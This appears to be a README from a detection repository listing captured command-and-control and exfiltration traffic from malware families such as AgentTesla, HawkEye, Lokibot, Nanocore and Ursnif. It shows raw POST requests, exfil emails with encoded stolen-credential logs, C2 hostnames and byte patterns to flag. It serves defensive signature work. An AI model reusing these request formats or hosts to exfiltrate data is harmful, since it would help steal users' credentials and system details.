### A repo for matching on known c2 and exfil traffic keywords (ctrl+f to search)

#### AgentTesla http:
~~~
POST /zin/WebPanel/api.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
Content-Type: application/x-www-form-urlencoded
Host: megaplast.co.rs
Content-Length: 308
Expect: 100-continue
Connection: Keep-Alive

HTTP/1.1 100 Continue

p=G1DZYwdIiDZ6V83seaZCmTT0wiCyOlXVS0OEx4YpkUAOuKO/6hfQJ%2BZD2LjpTbyu9w0gudjYXCIc0Ul74wtsvtqYLYuTR%2BlFVl%2B5deG0RnTTo6nFc1M9tx0%2BRo7WXetRdIHkmVMMSeqH%2BEroM7yttDzosvKfKgB%2BJ07oqT/YvQ6CPNW2%2BCETCU6oIlO9XYyrEy6/hYeF%2BgkfRc9xSEfZhh/7Wk0khJ4zZJ3cjEvXDxJcQWA739/yDUy4kOAndihYsWnLw1mVCHxJSJf7%2BguB9f4DpgX10NLpH
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agenttesla-http.png "AgentTesla HTTP")

#### AgentTesla smtp exil:
~~~
From: office@larbaxpo[.]com
To: officelogs@larbaxpo[.]com
Date: 9 Oct 2019 17:58:19 +0100
Subject: admin/USER-PC Recovered Cookies
Content-Type: multipart/mixed;
 boundary=--boundary_0_cac7ba32-e0f8-42d4-8b2e-71d1828e6ff7

----boundary_0_cac7ba32-e0f8-42d4-8b2e-71d1828e6ff7
Content-Type: text/html; charset=us-ascii
Content-Transfer-Encoding: quoted-printable

Time: 10/09/2019 17:58:13<br>UserName: admin<br>ComputerName: USE=
R-PC<br>OSFullName: Microsoft Windows 7 Professional <br>CPU: Int=
el(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 3583.61 MB<br>IP: 18=
5.183.107.236=0A<hr>
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agenttesla-submission.png "AgentTesla Submission")

#### Bladabindi - nJrat
~~~
147.ll1990MURFTUFZT19DNEJBMzY0Nw==1990USER-PC1990admin199018-03-2619901990Win 7 Professional SP1 x861990No1990N/A1990..1990UHJvZ3JhbSBNYW5hZ2VyAA==1990123.inf1990MURFTUFZTw0KMWRlbWF5by5kdWNrZG5zLm9yZzoxOTkwDQp2NC4wLjMwMzE5DQpSZWdTdmNzLmV4ZQ0KRmFsc2UNCkZhbHNlDQpGYWxzZQ0KRmFsc2U=15.CAP199035199023926.CAP1990......JFIF.....`.`.....C...........		.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/njrat.png "Bladabindi - nJrat")

#### Hawkeye keyogger
~~~
From: mosharrof@mhcapparels.com
To: mosharrof@mhcapparels.com
Date: 9 Oct 2019 01:57:35 +0100
Subject: HawkEye Keylogger - Reborn v9 - Passwords Logs - admin \ USER-PC -
 89.187.165.47
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: base64

SGF3a0V5ZSBLZXlsb2dnZXIgLSBSZWJvcm4gdjkNClBhc3N3b3JkcyBMb2dzDQphZG1p
biBcIFVTRVItUEMNCg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT0NClVSTCAgICAgICAgICAgICAgIDogaHR0cHM6Ly9tLmZhY2Vi
b29rLmNvbQ0KV2ViIEJyb3dzZXIgICAgICAgOiBGaXJlZm94IDMyKw0KVXNlciBOYW1l
ICAgICAgICAgOiBob25leUBwb3QuY29tDQpQYXNzd29yZCAgICAgICAgICA6IGhvbmV5
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/hawkeye.png "Hawkeye")

#### Imminent RAT
~~~
00000000  06 00 00 00 81 13 14 6e 5b 69                     .......n [i
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/imminent-1.png "Imminent")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/imminent-2.png "Imminent")

#### Lokibot

follw tcp stream, not http stream in wireshark
~~~
POST /sky/five/fre.php HTTP/1.0
User-Agent: Mozilla/4.08 (Charon; Inferno)
Host: fueda.info
Accept: */*
Content-Type: application/octet-stream
Content-Encoding: binary
Content-Key: 8DAA705A
Content-Length: 176
Connection: close

..'.......ckav.ru..
...a.d.m.i.n.......U.S.E.R.-.P.C.......U.S.E.R.-.P.C......................+................0...8.5.6.9.A.A.F.F.6.3.A.A.A.7.1.D.8.0.4.0.0.E.2.5.....Rqbay....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/lokibot.png "Lokibot")

#### Nanocore

flag on "38 00 00 00 17" pattern
~~~
00000000  38 00 00 00 17 f5 4b 2c c3 65 ca 9f eb bc fd 67   8.....K, .e.....g
00000010  ad 6d 0e c4 33 7d b6 40 17 17 97 a1 d9 7c 3c b3   .m..3}.@ .....|<.
00000020  04 ea d0 16 f2 cf 3e 51 29 18 55 e5 1c 7a 6a 91   ......>Q ).U..zj.
00000030  03 99 38 f7 ac 3b f7 89 85 2e c4 d8               ..8..;.. ....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-38.png "Nanocore 38")

flag on "40 00 00 00 17" pattern:
~~~
00000000  40 00 00 00 17 f5 4b 2c c3 65 ca 9f eb bc fd 67   @.....K, .e.....g
00000010  ad 6d 0e c4 33 7d b6 40 17 17 97 a1 d9 7c 3c b3   .m..3}.@ .....|<.
00000020  04 ea d0 16 87 30 8f fa 78 9d 2a 01 c2 51 ee 07   .....0.. x.*..Q..
00000030  bd e7 23 95 3e ab a1 04 ca 56 b3 fb b7 9b b7 3a   ..#.>... .V.....:
00000040  13 e5 2b 52                                        ..+R
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-40.png "Nanocore 40")

#### TA505 Loader:
~~~
POST /2021 HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2; CIBA; MS-RTC LM 8)
Content-Length: 95
Host: windows-sys-update.com

&D=User-PC&U=admin&OS=6.1&PR=Dwm.exe%7CEXCEL.EXE%7CExplorer.EXE%7Ctaskhost.exe%7Cwindanr.exe%7CHTTP/1.1 404 Not Found
Server: nginx/1.10.3
Date: Wed, 09 Oct 2019 18:53:18 GMT
Content-Length: 0
Connection: keep-alive
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ta505-loader.png "TA505 Loader")

#### Ursnif:
~~~
POST /images/wsF0B4sp/ZaYjjdVgt73Q1BSOy_2Fofi/qF_2BfPTuK/5Ha_2F0xEvmbSfT_2/FluJ8ZF_2Fx8/g6xkZAZrZwN/2skHgzv92i_2BS/uPf4RDQvATKCgx0GZ5gez/ph_2BLcscLQkKDVw/HGZ6zA6DhGCqgPD/VTX09Q_2FUWIFyWps1/nfJ0I3rIZ/QNKbXjeu7xXa3W_2FZSX/bcWtE2zC4RafXFoRlqL/4EC4YHwclzkXrfX/58a3.bmp HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: multipart/form-data; boundary=36775038942641984568
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Content-Length: 399
Host: shoshanna.at

--36775038942641984568
Content-Disposition: form-data; name="upload_file"; filename="78C6.bin"

\.\..V.]:.o..<]......H..)E.J=x...e%3..U.@.f......].tZ..1....g..OzC.5v.?o.NL...;..)..E.G.a~.....M#;.Cu;N/.3\$....x.....R....e..5.....-mW,..	..C................n.G.|..k0...@...?I.Iu......9k^.U6tzT9.b.3....#..V.4].La....zL.h+...aa..H.D.....Ar.......3.w.<.!.-.....|F9! 3.....7
--36775038942641984568--
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ursnif.png "Ursnif POST")
